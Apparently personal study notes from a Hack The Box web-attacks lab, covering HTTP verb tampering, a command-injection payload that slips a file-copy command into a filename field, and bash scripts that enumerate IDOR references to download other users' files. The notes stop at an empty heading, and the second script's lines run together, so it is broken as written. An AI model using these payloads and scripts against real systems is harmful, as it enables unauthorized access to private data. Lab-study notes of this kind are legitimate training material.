
# HTTP Verb Tampering
|Verb|Description|
|---|---|
|`HEAD`|Identical to a GET request, but its response only contains the `headers`, without the response body|
|`PUT`|Writes the request payload to the specified location|
|`DELETE`|Deletes the resource at the specified location|
|`OPTIONS`|Shows different options accepted by a web server, like accepted HTTP verbs|
|`PATCH`|Apply partial modifications to the resource at the specified location|
### Bypassing Basic Authentication
```bash
# Seeing what type of requests can be made.
curl -i -X OPTIONS http://SERVER_IP:PORT/

# Then right clicking on the request you can change the request method to something like post or head
```

# Bypassing Security Filters
```bash
# Inserting a command such as
file; cp /flag.txt ./

# Of course changing the method by right clicking and making it a post request and sending the command.

# This will make the file on the application but also copy the file doing 2 commands as one
```

# Verb Tampering Prevention
This section can be found on the hand the box Web attacks module

# Intro and Identifying IDOR
`Insecure Direct Object References (IDOR)`
A weak access control system, could have to do with Role-Based Access Controls `RBAC`
```bash
#!/bin/bash
url="http://154.57.164.82:32391"
echo "=== Mass IDOR Enumeration with POST ==="
for i in {1..20}; do
    echo "Checking uid $i"
    
    # Use POST method with uid parameter
    for link in $(curl -X POST -d "uid=$i" "$url/documents.php" | grep -oP "\/documents\/[^']*\.(pdf|txt)"); do
        echo "  Found: $link"
        
        # Download the file
        wget -q "$url$link"
        
        # If it's a .txt file, display content immediately
        filename=$(basename "$link")
        if [[ "$filename" == *.txt ]]; then
            echo "  *** FLAG FOUND: $filename ***"
            echo "  Content:"
            cat "$filename"
            echo "=========================="
        fi
    done
done
echo "=== Enumeration completed ==="
```

# Bypassing Encoded References
```bash
# Upon the request I get
MQ%3D%3D
echo "MQ%3D%3D" | python3 -c "import urllib.parse; print(urllib.parse.unquote(input()))"

# Then I get 
"MQ=="
echo "MQ== | base64 -d"
1

# For the second user
echo -n 2 | base64 -w 0
```

### The script
```bash
#!/bin/bash

url="http://IP/download.php?contract="echo "=== Bypassing Encoded References - Contract Enumeration ==="for i in {1..20}; do  
    # Reproduce the exact encoding: uid -> base64  
    encodedid=$(echo -n $i | base64 -w 0)  
      
    echo "Testing user $i (contract=$encodedid)..."  
      
    # Make request and capture response  
    response=$(curl -s "${url}${encodedid}")  
      
    # Check for meaningful content  
    if [[ ${#response} -gt 10 ]]; then  
        echo "  ✓ Found content for user $i:"  
        echo "$response"  
        echo "  =========================="  
    else  
        echo "  ✗ Empty or minimal response"  
    fi  
done
```

# IDOR in Insecure APIs
